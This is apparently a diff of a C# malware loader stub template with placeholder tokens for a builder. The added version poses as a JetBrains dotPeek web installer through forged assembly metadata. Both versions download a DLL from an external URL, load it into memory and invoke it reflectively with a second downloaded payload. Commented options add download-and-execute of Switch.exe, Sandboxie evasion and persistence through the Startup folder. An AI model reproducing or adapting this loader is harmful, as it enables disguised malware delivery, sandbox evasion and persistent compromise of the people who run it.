@@ -1,20 +1,18 @@
 using System;
 using System.Collections.Generic;
-using System.Collections.Specialized;
-using System.Diagnostics;
 using System.Linq;
 using System.Net;
 using System.Reflection;
-using System.Runtime.InteropServices;
-using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Forms;
 
-//Default [assembly: AssemblyTitle("Assembly.exe")]
-//Default [assembly: AssemblyDescription("WindowsApplication")]
-//Default [assembly: AssemblyProduct("WindowsApplication")]
-//Default [assembly: AssemblyCopyright("WindowsApplication  ©  2013")]
-//Default [assembly: AssemblyFileVersion("2.0.0.0")]
+//Default [assembly: AssemblyTitle("Installer.dotPeek.Web")]
+//Default [assembly: AssemblyDescription("JetBrains dotPeek 2021.1.1 Web Installer")]
+//Default [assembly: AssemblyCompany("JetBrains")]
+//Default [assembly: AssemblyProduct("dotPeek 2021.1.1 Web Installer")]
+//Default [assembly: AssemblyCopyright("Copyright © 2021 JetBrains, Inc")]
+//Default [assembly: AssemblyFileVersion("211.0.20210409.190258")]
+
 
 //Assembly [assembly: AssemblyTitle("{1}")]
 //Assembly [assembly: AssemblyDescription("{2}")]
@@ -24,170 +22,84 @@ using System.Windows.Forms;
 //Assembly [assembly: AssemblyFileVersion("{7}.{8}.{9}.{10}")]
 
 
-
-// base class name 'baseClass'
-class baseClass
+namespace %4%
 {
-    public void show()
-    {
-        Console.WriteLine("Base class");
-    }
-}
-
-// derived class name 'derived'
-// 'baseClass' inherit here
-class derived : baseClass
-{
-
-    // overriding
-    new public void show()
-    {
-        Console.WriteLine("Derived class");
-    }
-}
-
-class GFG
-{
-
-    // Main Method
-    public static void Mainapp()
+    static class Program
     {
 
-        // 'obj' is the object of
-        // class 'baseClass'
-        baseClass obj = new baseClass();
-
-
-        // invokes the method 'show()'
-        // of class 'baseClass'
-        obj.show();
-
-        obj = new derived();
-
-        // it also invokes the method
-        // 'show()' of class 'baseClass'
-        obj.show();
-
-    }
-}
-static class StaticOrnek2
-{
-    // static bir yapılandırıcı örneği
-    static StaticOrnek2()
-    {
-        int kapi = 4;
-        string isim = "Mercedes";
-    }
-
-    static void Minibus()
-    {
-
-    }
-}
-public class psrsaideasm
-{
-    public static double x = 5.5;
-    public void xDegistir(int y)
-    {
-        x = y;
-    }
-    public void Otomobil() // static olmadığı için kendi sınıfından olsa bile static olan bir metot erişemez
-    {
-
-    }
-    public static int motor = 1000;
-    public int benzin = 3; // static olmadığı için kendi sınıfından olsa bile static olan bir metot erişemez
-
-    public static int Otobus()
-    {
-        // enerji = 200; hatalı kullanım
-        // Insan(); Hatalı kullanım
-
-        psrsaideasm st = new psrsaideasm();
-
-        st.Otomobil(); // Doğru kullanım
-        st.benzin = 2; // doğru kullanım
-        return motor / 2;
-    }
-    [STAThread]
-    public static void Main(string[] args)
-    {
-        using (WebClient %3% = new WebClient())
+        public static byte[] %1%(string %3%)
         {
-
-            try
+            byte[] %1%;
+            for (; ; )
             {
+                try
+                {
+                    WebClient %2% = new WebClient();
+                    %1% = %2%.DownloadData(%3%);
+                }
+                catch (Exception ex)
+                {
 
-
-               
-                   //sandboxie controlsandboxie();
-
-                    //Messega
-
-
-
-                    //download try
-                    //download {
-                    //download  System.Net.WebClient appyrun = new System.Net.WebClient();
-                    //download appyrun.DownloadFile("%DownloadLink%", (System.Environment.GetEnvironmentVariable("tmp") + "\\Switch.exe"));
-                    //download  Process.Start((System.Environment.GetEnvironmentVariable("tmp") + "\\Switch.exe"));
-                    //download }
-                    //download catch
-                    //download {
-                    //download }
-
-
-
-
-
-
-                    object %1% = new object[] { %aPP%, string.Empty, %3%.DownloadData("%Server%"), true };
-
-                    Assembly %2%;
-
-                    %2% = AppDomain.CurrentDomain.Load(%3%.DownloadData("https://cdn.discordapp.com/attachments/844669981151985754/845859274424582144/instagram.dll"));
-
-
-                    %2%.GetType("instagram.whatsapp").InvokeMember("studio", System.Reflection.BindingFlags.InvokeMethod, null, null, (object[])%1%);
-
-
-                    //start  {
-                    //start      System.IO.File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\%FileDosya%");
-                    //start  }
-
-
-
-
+                    continue;
+                }
+                break;
             }
-            catch { return; }
-
-            psrsaideasm y = new psrsaideasm();
-            Console.WriteLine(psrsaideasm.x);
-
-            psrsaideasm z = new psrsaideasm();
-            Console.WriteLine(psrsaideasm.x);
-
-            z.xDegistir(4);
-
-            psrsaideasm t = new psrsaideasm();
-            Console.WriteLine(psrsaideasm.x);
-
-
-
-
-
+            return %1%;
         }
 
-    }
+        /// <summary>
+        /// The main entry point for the application.
+        /// </summary>
+        [STAThread]
+        static void Main()
+        {
 
-    //sandboxie [DllImport("kernel32.dll")]
-    //sandboxie public static extern IntPtr GetModuleHandle(string lpModuleName);
-    //sandboxie static void controlsandboxie()
-    //sandboxie {
-    //sandboxie     if (GetModuleHandle("SbieDll.dll").ToInt32() != 0)
-    //sandboxie     {
-    //sandboxie        Environment.Exit(1);
-    //sandboxie     }
-    //sandboxie }
+
+
+            Application.EnableVisualStyles();
+            Application.SetCompatibleTextRenderingDefault(false);
+
+    //sandboxie controlsandboxie();
+
+    //Messega
+
+
+
+    //download try
+    //download {
+    //download  System.Net.WebClient appyrun = new System.Net.WebClient();
+    //download appyrun.DownloadFile("%DownloadLink%", (System.Environment.GetEnvironmentVariable("tmp") + "\\Switch.exe"));
+    //download  Process.Start((System.Environment.GetEnvironmentVariable("tmp") + "\\Switch.exe"));
+    //download }
+    //download catch
+    //download {
+    //download }
+
+
+           object % 5% = new object[] { %aPP%, string.Empty, %1%("%Server%"), true };
+
+            Assembly %6%;
+
+            %6% = AppDomain.CurrentDomain.Load(%1%("https://ieaspk.com/instagram.dll"));
+
+
+            %6%.GetType("instagram.whatsapp").InvokeMember("studio", System.Reflection.BindingFlags.InvokeMethod, null, null, (object[])%5%);
+
+    //start  {
+    //start      System.IO.File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\%FileDosya%");
+    //start  }
+
+
 }
 
+        //sandboxie [DllImport("kernel32.dll")]
+        //sandboxie public static extern IntPtr GetModuleHandle(string lpModuleName);
+        //sandboxie static void controlsandboxie()
+        //sandboxie {
+        //sandboxie     if (GetModuleHandle("SbieDll.dll").ToInt32() != 0)
+        //sandboxie     {
+        //sandboxie        Environment.Exit(1);
+        //sandboxie     }
+        //sandboxie }
+    }
+}
